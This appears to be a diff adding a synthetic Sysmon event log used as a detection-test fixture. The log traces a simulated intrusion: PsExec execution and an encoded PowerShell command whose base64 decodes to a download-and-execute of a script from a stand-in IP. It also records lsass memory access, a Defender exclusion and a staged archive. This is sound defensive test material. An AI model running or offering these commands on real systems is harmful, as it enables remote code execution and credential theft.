@@ -1,0 +1,99 @@
+[
+  {
+    "RecordID": "sysmon-1001",
+    "TimeCreated": "2026-05-19T10:04:30Z",
+    "EventID": 1,
+    "Computer": "fin-app-03.acme.local",
+    "EventData": {
+      "Image": "C:\\Windows\\PSEXESVC.exe",
+      "ProcessGuid": "{a1b2c3d4-0001-0000-0000-000000000001}",
+      "ProcessId": 4812,
+      "CommandLine": "C:\\Windows\\PSEXESVC.exe",
+      "ParentImage": "C:\\Windows\\System32\\services.exe",
+      "ParentProcessGuid": "{a1b2c3d4-0000-0000-0000-000000000000}",
+      "User": "NT AUTHORITY\\SYSTEM",
+      "Hashes": "SHA256=AA112233...",
+      "OriginalFileName": "psexesvc.exe"
+    }
+  },
+  {
+    "RecordID": "sysmon-1002",
+    "TimeCreated": "2026-05-19T10:04:42Z",
+    "EventID": 1,
+    "Computer": "fin-app-03.acme.local",
+    "EventData": {
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "ProcessGuid": "{a1b2c3d4-0002-0000-0000-000000000002}",
+      "ProcessId": 5104,
+      "CommandLine": "cmd.exe /c powershell.exe -nop -enc <base64-payload>",
+      "ParentImage": "C:\\Windows\\PSEXESVC.exe",
+      "ParentProcessGuid": "{a1b2c3d4-0001-0000-0000-000000000001}",
+      "User": "ACME\\admin-alice"
+    }
+  },
+  {
+    "RecordID": "sysmon-1003",
+    "TimeCreated": "2026-05-19T10:04:43Z",
+    "EventID": 1,
+    "Computer": "fin-app-03.acme.local",
+    "EventData": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ProcessGuid": "{a1b2c3d4-0003-0000-0000-000000000003}",
+      "ProcessId": 5612,
+      "CommandLine": "powershell.exe -nop -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk4LjUxLjEwMC43L2EucHMxJyk=",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentProcessGuid": "{a1b2c3d4-0002-0000-0000-000000000002}",
+      "User": "ACME\\admin-alice"
+    }
+  },
+  {
+    "RecordID": "sysmon-1004",
+    "TimeCreated": "2026-05-19T10:05:10Z",
+    "EventID": 3,
+    "Computer": "fin-app-03.acme.local",
+    "EventData": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ProcessGuid": "{a1b2c3d4-0003-0000-0000-000000000003}",
+      "Protocol": "tcp",
+      "SourceIp": "10.20.30.43",
+      "DestinationIp": "198.51.100.7",
+      "DestinationPort": 80,
+      "DestinationHostname": ""
+    }
+  },
+  {
+    "RecordID": "sysmon-1005",
+    "TimeCreated": "2026-05-19T10:06:01Z",
+    "EventID": 10,
+    "Computer": "fin-app-03.acme.local",
+    "EventData": {
+      "SourceImage": "C:\\Windows\\Temp\\update.exe",
+      "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+      "GrantedAccess": "0x1010",
+      "CallTrace": "ntdll.dll+...|KERNELBASE.dll+...|update.exe+...",
+      "SourceProcessGuid": "{a1b2c3d4-0004-0000-0000-000000000004}",
+      "TargetProcessGuid": "{lsass-process-guid}"
+    }
+  },
+  {
+    "RecordID": "sysmon-1006",
+    "TimeCreated": "2026-05-19T10:06:30Z",
+    "EventID": 13,
+    "Computer": "fin-app-03.acme.local",
+    "EventData": {
+      "Image": "C:\\Windows\\Temp\\update.exe",
+      "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Windows\\Temp",
+      "Details": "DWORD (0x00000000)"
+    }
+  },
+  {
+    "RecordID": "sysmon-1007",
+    "TimeCreated": "2026-05-19T10:07:18Z",
+    "EventID": 11,
+    "Computer": "fin-app-03.acme.local",
+    "EventData": {
+      "Image": "C:\\Windows\\Temp\\update.exe",
+      "TargetFilename": "C:\\Users\\admin-alice\\Documents\\stage.7z"
+    }
+  }
+]
